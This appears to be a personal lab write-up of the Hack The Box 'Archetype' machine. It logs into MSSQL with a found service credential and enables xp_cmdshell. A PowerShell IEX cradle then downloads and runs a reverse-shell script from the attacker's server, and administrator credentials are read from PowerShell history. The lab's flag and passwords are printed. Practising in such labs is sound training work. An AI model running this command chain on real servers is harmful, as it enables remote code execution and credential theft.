# Archetype (10.10.10.27) MSSQL
[[archetype (10.10.10.27)]]
## Summary
- Found user flag
- Found adminstrator credentials
## Procedure
1. Anonymous Authentication (Failed)
2. Authenticate as ARCHETYPE\sql_svc
	```
	tyler@tyler-ops:~/Documents/learn/htb/starting_point/archetype$ mssqlclient.py -windows-auth ARCHTYPE/sql_svc:M3g4c0rp123@10.10.10.27
	Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

	[*] Encryption required, switching to TLS
	[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
	[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
	[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
	[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
	[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
	[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
	[!] Press help for extra shell commands
	SQL> help

		 lcd {path}                 - changes the current local directory to {path}
		 exit                       - terminates the server process (and this session)
		 enable_xp_cmdshell         - you know what it means
		 disable_xp_cmdshell        - you know what it means
		 xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
		 sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
		 ! {cmd}                    - executes a local shell cmd

	SQL>
	```
	![[Pasted image 20210816150405.png]]
3. enable_xp_cmdshell
4. Start http server
	- `python3 -m http.server`
5. Listen on port 3602
	- `ncat -nvlp 3602`
6. Execute Revershell
	```
	xp_cmdshell powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.54:8000/scripts/twof_reverse_shell.ps1\");`
	```
	```
	tyler@tyler-ops:~/Documents/learn/htb/starting_point/archetype$ ncat -nvlp 3602
	Ncat: Version 7.91 ( https://nmap.org/ncat )
	Ncat: Listening on :::3602
	Ncat: Listening on 0.0.0.0:3602
	Ncat: Connection from 10.10.10.27.
	Ncat: Connection from 10.10.10.27:49675.
	whoami
	archetype\sql_svc
	```
	![[Pasted image 20210816154950.png]]
	- Reverse shell based on script from [PayloadsAllTheThings](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)
7. Found user flag
	```
	cd C:\Users\sql_svc\Desktop

	pwd

	Path
	----
	C:\Users\sql_svc\Desktop



	cat user.txt
	3e7b102e78218e935bf3f4951fec21a3
	```
	![[Pasted image 20210816155229.png]]
	- User flag: `3e7b102e78218e935bf3f4951fec21a3`
8. Found admin credentials
	```
	cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine

	cat ConsoleHost_history.txt
	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
	exit
	```
	![[Pasted image 20210816160541.png]]
	- User: `administrator`
	- Pass: `MEGACORP_4dm1n!!`